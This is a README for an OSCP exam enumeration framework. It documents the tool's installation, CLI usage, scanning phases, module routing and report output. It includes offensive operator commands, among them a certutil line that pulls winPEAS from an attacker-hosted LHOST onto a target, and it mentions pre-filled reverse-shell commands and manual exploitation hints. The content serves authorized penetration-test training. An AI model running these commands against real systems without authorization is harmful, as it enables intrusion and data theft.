# OSCP Enumeration Framework

```
  ██████╗ ███████╗ ██████╗██████╗      E N U M E R A T I O N   F R A M E W O R K
 ██╔═══██╗██╔════╝██╔════╝██╔══██╗     Assisted recon.  Never autopwn.
 ██║   ██║███████╗██║     ██████╔╝     Recon  →  Enumerate  →  Report
 ██║   ██║╚════██║██║     ██╔═══╝
 ╚██████╔╝███████║╚██████╗██║          ☠  by acanoman  ☠
  ╚═════╝ ╚══════╝ ╚═════╝╚═╝
```

> **Modular, OSCP-compliant enumeration automation.**  
> Every command printed. Zero exploitation. Full operator control.

---

## Table of Contents

1. [Installation](#installation)
2. [OSCP Exam — Exact Commands](#oscp-exam--exact-commands)
3. [How to Run It — CLI Reference](#how-to-run-it)
4. [The Automation Flow](#the-automation-flow)
5. [The Lifecycle of a Finding](#the-lifecycle-of-a-finding)
6. [Output Structure](#output-structure)
7. [Module Reference](#module-reference)
8. [OSCP Compliance Rules](#oscp-compliance-rules)

---

## Installation

```bash
# 1. Clone the repo
git clone <repo-url> oscp-framework && cd oscp-framework

# 2. Install all dependencies (apt packages + pip + gem)
bash install.sh

# 3. Confirm everything works
python main.py --help
```

`install.sh` installs: nmap, ldap-utils, smbclient, enum4linux-ng, smbmap,
netexec/crackmapexec, snmp, onesixtyone, redis-tools, nikto, gobuster,
feroxbuster, whatweb, python3 packages (rich, impacket), evil-winrm, and
runs a smoke-test that imports every Python module.

---

## OSCP Exam — Exact Commands

Copy these commands at exam start. Replace `<TARGET>`, `<DOMAIN>`, and `<YOUR_TUN0>` with your actual values.

### Step 1 — Find your tun0 IP (run once at exam start)

```bash
ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
# Example output: 10.10.14.5
```

### Step 2 — Enumerate a standalone Linux/Windows target

```bash
python main.py \
  --target <TARGET> \
  --lhost <YOUR_TUN0> \
  --output-dir /root/oscp/exam
```

### Step 3 — Enumerate an Active Directory target (with domain)

```bash
python main.py \
  --target <TARGET> \
  --domain <DOMAIN> \
  --lhost <YOUR_TUN0> \
  --output-dir /root/oscp/exam
```

### Step 4 — If the session was interrupted, resume it

```bash
# --resume loads session.json, skips Nmap, continues from where you left off
python main.py \
  --target <TARGET> \
  --domain <DOMAIN> \
  --lhost <YOUR_TUN0> \
  --output-dir /root/oscp/exam \
  --resume
```

> **Why `--resume` is explicit:**  
> Without `--resume`, the framework always starts a fresh scan even if `session.json`
> exists. This prevents accidentally skipping a service that appeared after a network
> change. You must consciously opt-in to resume.

### Step 5 — Review the output

```bash
# Open the report in any Markdown viewer
cat /root/oscp/exam/<TARGET>/notes.md

# Monitor in real time while enumeration runs
watch -n 5 cat /root/oscp/exam/<TARGET>/notes.md

# Check for background vuln scan results (the framework alerts you when done)
cat /root/oscp/exam/<TARGET>/scans/vulns.txt
```

### What `--lhost` does

When you pass `--lhost 10.10.14.5`, the Arsenal Recommender section of `notes.md`
pre-fills **every** transfer and reverse-shell command with your attacker IP:

```markdown
# Without --lhost (default):
- [ ] 💡 `certutil.exe -urlcache -f http://<LHOST>:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`

# With --lhost 10.10.14.5:
- [ ] 💡 `certutil.exe -urlcache -f http://10.10.14.5:8000/windows/winPEAS.exe C:\Windows\Temp\winPEAS.exe`
```

You can copy-paste directly — no manual editing required.

### Typical exam timeline

```
T+00:00  python main.py --target 10.10.10.10 --lhost 10.10.14.5
T+00:05  Nmap fast scan finishes → open ports known
T+00:10  Background NSE vuln scan launches (runs in parallel)
T+00:15  Tier-1 modules finish (SMB · FTP · LDAP · DNS · SNMP · NFS)
T+00:30  Tier-2 modules finish (Databases · Remote · Mail)
T+02:00  Tier-3 finishes (Web — feroxbuster/gobuster on all ports)
         🔔 DING! — NSE vuln scan alert fires
T+02:01  notes.md complete — open it and start manual work
```

---

## How to Run It

### Standard full-auto scan (most common)

```bash
# With your tun0 IP so Arsenal Recommender commands are pre-filled
python main.py --target 10.10.10.10 --lhost 10.10.14.5
```

Runs Nmap discovery → detects all open services → routes each service to the
correct enumeration module → writes `notes.md` with findings and checklist.
Per-module elapsed time is printed after each module. Total session time is
shown at the end.

### With a known domain (Active Directory / Windows targets)

```bash
python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5
```

The domain is passed to LDAP (base DN queries), DNS (zone transfer, TXT records),
SMB (Kerberoast hints), and web modules (vhost scanning).

### Dry-run — preview every command without executing any

```bash
python main.py --target 10.10.10.10 --dry-run
```

Prints the exact commands that *would* run. Use this to review scope, audit what
the framework does, or copy-paste individual commands for manual execution.

### Force specific modules (skip discovery)

```bash
# Only enumerate SMB and LDAP
python main.py --target 10.10.10.10 --modules smb ldap

# Only run web enumeration
python main.py --target 10.10.10.10 --modules web

# Run Tier-2 modules only
python main.py --target 10.10.10.10 --modules databases remote mail
```

Available module names:

| Tier | Modules |
|------|---------|
| 1 — Lightning Fast | `smb` `ftp` `ldap` `dns` `snmp` `nfs` `services` `network` |
| 2 — Medium | `databases` `remote` `mail` |
| 3 — Heavy (always last) | `web` |

### Resume a previous session (explicit opt-in)

Pass `--resume` to load `session.json` from the previous run and skip Nmap.
**Without `--resume`, the framework always starts fresh** — even if `session.json`
exists — so you never accidentally skip a service that appeared after a change.

```bash
# Continue where you left off after an interruption
python main.py --target 10.10.10.10 --lhost 10.10.14.5 --resume

# Resume with a domain (if domain was discovered in the first run)
python main.py --target 10.10.10.10 --domain corp.local --lhost 10.10.14.5 --resume
```

When resumed, the banner shows `Mode: RESUME` and a green panel lists the
already-known ports so you immediately see the session state.

### Custom output directory

```bash
python main.py --target 10.10.10.10 --output-dir /root/oscp/exam
```

### Abort a single tool (not the whole session)

Press **Ctrl+C** once while a tool is running. The framework catches the
interrupt, flushes `notes.md`, saves state, and moves on to the next module.
Press **Ctrl+C** twice rapidly to abort the entire session.

---

## The Automation Flow

Understanding this makes you a better operator — you know exactly what the
framework is doing and why at every step.

```
python main.py --target 10.10.10.10
        │
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1 — INITIAL RECON  (wrappers/recon.sh)                   │
│                                                                  │
│  1a. Fast TCP scan (all 65535 ports, --min-rate 5000)           │
│  1b. Deep version scan (-sC -sV -O) on open ports only          │
│  1c. UDP top-100 scan                                            │
│  1d. NSE vuln scan launched in background → vulns.pid saved     │
│                                                                  │
│  Output: scans/nmap_initial.xml  ◄── Python parser reads this   │
└─────────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 2 — PORT PARSING  (core/parser.py)                       │
│                                                                  │
│  NmapParser reads the XML and fills session.info with:          │
│    open_ports = {22, 80, 445, 3389, ...}                        │
│    port_details[80] = {                                          │
│        "service": "http",                                        │
│        "version": "Apache httpd 2.4.41",                        │
│        "proto":   "tcp",                                         │
│    }                                                             │
│                                                                  │
│  The "service" string comes directly from Nmap's -sV detection. │
└─────────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 3 — SERVICE-BASED MODULE ROUTING  (core/engine.py)       │
│                                                                  │
│  For every open port, TWO-PASS lookup:                          │
│                                                                  │
│  Pass 1 — SERVICE NAME (primary):                               │
│    "http"          → web                                         │
│    "microsoft-ds"  → smb                                         │
│    "ms-wbt-server" → remote   ← RDP, even on non-standard port  │
│    "ms-sql-s"      → databases                                   │
│    "domain"        → dns                                         │
│    "rpcbind"       → nfs                                         │
│    "ssl/ftp"       → ftp      ← ssl/ prefix stripped & retried  │
│    "http?"         → web      ← trailing ? removed & retried    │
│                                                                  │
│  Pass 2 — PORT NUMBER FALLBACK (when service = "unknown"):      │
│    port 445  → smb                                               │
│    port 3389 → remote                                            │
│    port 6379 → databases                                         │
│                                                                  │
│  Result: ordered, deduplicated module list                       │
└─────────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 4 — TIER-SORTED MODULE EXECUTION                          │
│                                                                  │
│  🟢 TIER 1 — smb · ftp · ldap · dns · snmp · nfs · services   │
│     (fast; user/domain findings feed Tier 2 and 3)              │
│                                                                  │
│  🟡 TIER 2 — databases · remote · mail                          │
│     (uses user lists from Tier 1 for smarter enumeration)       │
│                                                                  │
│  🔴 TIER 3 — web  (always last; longest running)                │
│                                                                  │
│  Each module:                                                    │
│    1. Calls its Bash wrapper (prints [CMD] before every tool)   │
│    2. Parses the wrapper's output files                         │
│    3. Writes findings to session.info                           │
│    4. Calls session.finalize_notes() → notes.md updated NOW     │
│                                                                  │
│  Ctrl+C during any module → skips to next, notes flushed        │
└─────────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 5 — REPORT  (core/session.py + core/recommender.py)     │
│                                                                  │
│  Recommender prints Rich table to console.                      │
│  finalize_notes() writes the complete notes.md.                 │
│  session.json saved for resume capability.                      │
└─────────────────────────────────────────────────────────────────┘
```

---

## The Lifecycle of a Finding

This traces one specific finding — **anonymous FTP login** — from the Bash script
through the Python engine into the final `notes.md`. This is the exact data flow
for every finding in the framework.

### Step 1 — The Bash wrapper executes

`modules/ftp.py` builds this command and passes it to the engine's `_exec()`:

```bash
bash wrappers/services_enum.sh \
    --target 10.10.10.10 \
    --output-dir output/targets/10.10.10.10 \
    --ports 21
```

Inside `services_enum.sh`, the FTP section runs:

```bash
FTP_RESULT=$(timeout 10 bash -c \
    "printf 'user anonymous anonymous\nls -la\npwd\nquit\n' | ftp -nv 10.10.10.10 21")

echo "$FTP_RESULT" > ftp/ftp_anon_test.txt
```

If the server responds with `230 Login successful`, the wrapper:
1. Prints `[+] FTP anonymous login: PERMITTED` to stdout
2. Runs `ftp -nv` with `ls -R` to get the directory tree → saves to `ftp_tree.txt`
3. Runs `nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst` → saves to `ftp/nmap_ftp.txt`

The wrapper's stdout streams to the terminal in real time. The **output files are
what the Python engine reads next**.

### Step 2 — The Python module reads the output files

After the wrapper exits, `modules/ftp.py` calls `_parse_ftp(session, log)`:

```python
def _parse_ftp(session, log) -> None:
    content = ftp_f.read_text()   # reads ftp/nmap_ftp.txt

    if re.search(r"ftp-anon:.*Login correct|Anonymous FTP login allowed",
                 content, re.IGNORECASE):

        log.warning("FTP: anonymous login allowed")

        # This is the critical line — writes to session.info.notes
        session.add_note("✅ FTP FINDING: Anonymous login allowed — ftp/nmap_ftp.txt")

        listing = re.findall(r"^\|.+$", content, re.MULTILINE)
        if listing:
            session.add_note(
                "📁 FTP anonymous directory listing:\n" + "\n".join(listing[:20])
            )
```

`session.add_note()` appends a timestamped string to `session.info.notes`:

```python
def add_note(self, text: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    self.info.notes.append(f"[{ts}] {text}")
```

At this point the finding lives in `session.info.notes` — an in-memory list.

### Step 3 — Manual hints are pre-injected (before the wrapper even runs)

`modules/ftp.py` calls `_add_manual_hints()` *before* the wrapper, so hints
appear in `notes.md` even if the user interrupts the tool:

```python
session.add_note("💡 [MANUAL] Anonymous login: ftp 10.10.10.10")
session.add_note("💡 [MANUAL] Download all files: wget -m ftp://anonymous:anonymous@10.10.10.10/")
```

### Step 4 — `finalize_notes()` renders notes.md

After the FTP module completes, `engine.py` calls:

```python
self.session.finalize_notes()
self.session.save_state()
```

`finalize_notes()` in `core/session.py` reads all notes, partitions them by
keyword, and renders structured Markdown:

**Vuln notes** (keyword: "vulnerable", "cve-", …) → `## ⚠️ Vulnerabilities` section  
**Success notes** (keyword: "anonymous", "login allowed", …) → `## ✅ Confirmed Access` section  
**Manual hints** (keyword: "💡") → `## 💡 Manual Follow-Up Commands` section as `- [ ]` checklist items  
**Timeline** (everything else) → `## 📝 Session Timeline` section in a fenced code block

The anonymous FTP finding appears in the final `notes.md` as:

```markdown
## ✅ Confirmed Access & Anonymous Sessions

- ✅  [09:14:32] FTP FINDING: Anonymous login allowed — ftp/nmap_ftp.txt
- ✅  [09:14:32] FTP anonymous directory listing: (first 20 lines)

---

## 💡 Manual Follow-Up Commands

- [ ] 💡 `Anonymous login: ftp 10.10.10.10`
- [ ] 💡 `Download all files: wget -m ftp://anonymous:anonymous@10.10.10.10/`
```

### Summary — the complete data flow

```
services_enum.sh runs ftp-anon NSE
        │
        │  writes → ftp/nmap_ftp.txt
        ▼
modules/ftp.py: _parse_ftp() reads nmap_ftp.txt
        │
        │  regex match: "Anonymous FTP login allowed"
        │  session.add_note("✅ FTP FINDING: Anonymous login allowed")
        │  session.add_note("💡 [MANUAL] wget -m ftp://...")
        ▼
session.info.notes  (in-memory list)
        │
        │  engine.py calls session.finalize_notes()
        ▼
core/session.py: finalize_notes()
        │  partitions notes by keyword
        │  renders ✅ section, 💡 checklist, 📝 timeline
        ▼
output/targets/10.10.10.10/notes.md  ← written to disk
```

This same flow applies to every finding — SMB null sessions, LDAP anonymous
binds, Redis unauthenticated access, VNC no-auth — the only difference is which
Bash wrapper runs and which regex fires in the Python parser.

---

## Output Structure

```
output/targets/<IP>/
│
├── notes.md              ← Master report (updated after every module)
├── session.json          ← State file — enables session resume
├── session.jsonl         ← Structured JSON Lines audit log
│
├── scans/
│   ├── nmap_initial.xml  ← Parsed by engine (service → module routing)
│   ├── targeted.nmap     ← Human-readable deep scan
│   ├── allports.txt      ← Fast port scan
│   ├── udp.txt           ← UDP top-100
│   ├── vulns.txt         ← NSE vuln scan (background, may still running)
│   └── vulns.pid         ← PID of background vuln scan
│
├── smb/
│   ├── users_rpc.txt     ← Consolidated user list (fed to SMTP, mail modules)
│   ├── nxc_rid_brute.txt
│   ├── interesting_files.txt
│   └── ...
│
├── ldap/
│   ├── base_dn.txt       ← Auto-detected base DN
│   ├── ldap_users.txt    ← LDAP user list (fed to SMTP module)
│   ├── ldap_spns.txt     ← Kerberoastable accounts
│   ├── asrep_candidates.txt
│   └── ...
│
├── web/
│   ├── tls_sans_<port>.txt   ← TLS SAN hostnames (HTTPS targets)
│   ├── whatweb_<port>.txt
│   ├── gobuster_<port>.txt
│   ├── feroxbuster_<port>.txt
│   ├── discovered_hostnames.txt
│   └── ...
│
├── dns/
│   ├── zone_transfer.txt
│   ├── dns_txt.txt           ← TXT records (SPF, DMARC, cloud indicators)
│   ├── domain_detected.txt   ← Auto-detected domain
│   └── ...
│
├── snmp/
│   ├── snmp_interfaces.txt   ← Network interfaces (pivot detection)
│   ├── snmp_ip_addrs.txt
│   └── ...
│
├── ftp/
│   ├── ftp_tree.txt          ← Recursive listing (no download)
│   └── ftp_interesting.txt
│
├── db/                       ← All database engines
├── remote/                   ← RDP, WinRM, VNC
├── nfs/
├── smtp/
└── banners/                  ← Raw banner grabs for non-standard ports
```

---

## Module Reference

| Module | Tier | Key Tools | Notable Features |
|--------|------|-----------|-----------------|
| `smb` | 1 | enum4linux-ng, smbmap, nxc, rpcclient | RID cycling → impacket-lookupsid fallback |
| `ftp` | 1 | nmap NSE, ftp client | Anon probe → recursive ls-R tree |
| `ldap` | 1 | ldapsearch, windapsearch | AS-REP + SPN detection, base DN auto-extract |
| `dns` | 1 | dig, dnsrecon | Zone transfer, TXT records, domain auto-detect |
| `snmp` | 1 | onesixtyone, snmpwalk | Dual-homed detection via interface OIDs |
| `nfs` | 1 | rpcinfo, showmount, nmap NSE | no_root_squash warning |
| `services` | 1 | ssh-audit, nmap | SSH auth-method enum |
| `databases` | 2 | nmap NSE, redis-cli, curl | SCAN not KEYS (non-blocking), CouchDB/ES |
| `remote` | 2 | nmap NSE, nxc | NXC RDP+WinRM rapid fingerprint |
| `mail` | 2 | smtp-user-enum | VRFY→RCPT fallback, uses smb/ldap user lists |
| `web` | 3 | whatweb, gobuster, feroxbuster, nikto | Smart extensions (Java/Python/Ruby), TLS SANs |

---

## OSCP Compliance Rules

| Rule | Enforcement |
|------|-------------|
| **No brute-force** | Hydra/Medusa appear only as `💡 [MANUAL]` hints |
| **No exploitation** | Redis write-primitive, xp_cmdshell, NFS SUID plant → `[MANUAL]` only |
| **No autopwn** | Engine stops at enumeration; no Metasploit; no shellcode |
| **Full transparency** | Every command printed with `[CMD]` prefix before execution |
| **User controls scope** | Ctrl+C skips current tool → continues; double Ctrl+C exits |
| **Credential safety** | `--user`/`--pass` used only for authenticated enumeration, never spraying |
| **Clean output** | Every finding logged to `notes.md` in real time — exam evidence ready |

---

*OSCP Enumeration Framework — by acanoman*
